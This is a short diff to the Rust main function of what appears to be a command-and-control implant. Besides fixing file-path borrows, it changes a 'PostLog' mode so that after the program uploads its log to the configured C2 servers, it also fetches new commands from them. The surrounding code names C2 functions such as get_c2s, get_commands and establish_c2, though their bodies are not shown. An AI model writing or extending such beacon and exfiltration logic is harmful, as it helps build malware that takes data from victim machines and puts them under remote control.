@@ -71,9 +71,9 @@ fn main() {
     builder.format(|buf, record| writeln!(buf, "{} - {}", record.level(), record.args()));
     // log to specified output file, if any
     if let Some(save_to) = cli.output.clone() {
-        if let Ok(file) = std::fs::File::create(save_to) {
+        if let Ok(file) = std::fs::File::create(&save_to) {
             builder.target(Target::Pipe(Box::new(file)));
-            out = String::from(save_to);
+            out = String::from(&save_to);
         } else {
             builder.target(Target::Stdout);
         }
@@ -140,7 +140,11 @@ fn main() {
                     get_commands(get_c2s(&conf), get_docname(&conf));
                     new_conf = true;
                 }
-                Modes::PostLog => post_log(get_c2s(&conf), out),
+                Modes::PostLog => {
+                    post_log(get_c2s(&conf), out.clone());
+                    get_commands(get_c2s(&conf), get_docname(&conf));
+                    new_conf = true;
+                }
                 Modes::CnC => establish_c2(),
                 // _ => unreachable!(), // panics if code becomes not unreachable
             }
